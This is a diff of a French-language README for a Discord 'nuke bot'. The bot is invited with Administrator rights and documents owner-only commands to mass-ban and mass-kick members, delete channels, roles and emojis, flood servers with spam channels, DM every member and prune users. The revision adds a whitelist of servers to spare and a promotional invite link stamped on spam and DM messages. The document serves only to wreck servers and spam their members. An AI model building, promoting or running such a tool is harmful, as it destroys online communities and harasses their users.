@@ -1,42 +1,30 @@
-# Nuke Bot Discord
+# Nuke Bot — prefix only
 
-Bot de nuke pur. Invite avec **Administrator**.
-
-## Variables Railway
+## Variables
 
 ```
-TOKEN=ton_token_bot
-OWNER_IDS=ton_id_discord
+TOKEN=...
+OWNER_IDS=ton_id
+WHITELIST_GUILDS=id1,id2
 ```
-
-Aussi acceptés : `DISCORD_TOKEN`, `BOT_TOKEN`, `OWNER_ID`.
-
-## Invite
-
-OAuth2 → URL Generator :
-- scopes : `bot` + `applications.commands`
-- permission : **Administrator**
 
 ## Commandes (owner only)
 
-| Prefix | Slash | Action |
-|--------|-------|--------|
-| `!nuke` | `/nuke` | Nuke complet |
-| `!banall` | `/banall` | Ban massif |
-| `!kickall` | | Kick massif |
-| `!delchannels` | `/delchannels` | Delete channels |
-| `!delroles` | | Delete roles |
-| `!delemojis` | | Emojis + stickers |
-| `!spam [n]` | | Créer n channels + flood |
-| `!rename` | | Rename serveur |
-| `!dmall <msg>` | | DM all |
-| `!leave` | | Quitte le serveur |
-| `!guilds` | | Liste serveurs |
-| `!status` | | État |
-| `!helpnuke` | | Aide |
+```
+!nuke [id]
+!banall / !kickall
+!delchannels / !delroles / !delemojis
+!spam [n]
+!rename [name]
+!dmall [msg]
+!prune [days]
+!whitelist add <serverID>
+!whitelist remove <serverID>
+!whitelist list
+!unwhitelist <serverID>
+!leave / !guilds / !status / !helpnuke
+```
 
-## Intents Discord
+Spam / DM / nuke footer = promo discord.gg/SKyfbZxzbp
 
-Bot → Privileged Gateway Intents :
-- SERVER MEMBERS INTENT ON
-- MESSAGE CONTENT INTENT ON
+Invite: bot + Administrator. Intents: Members + Message Content.
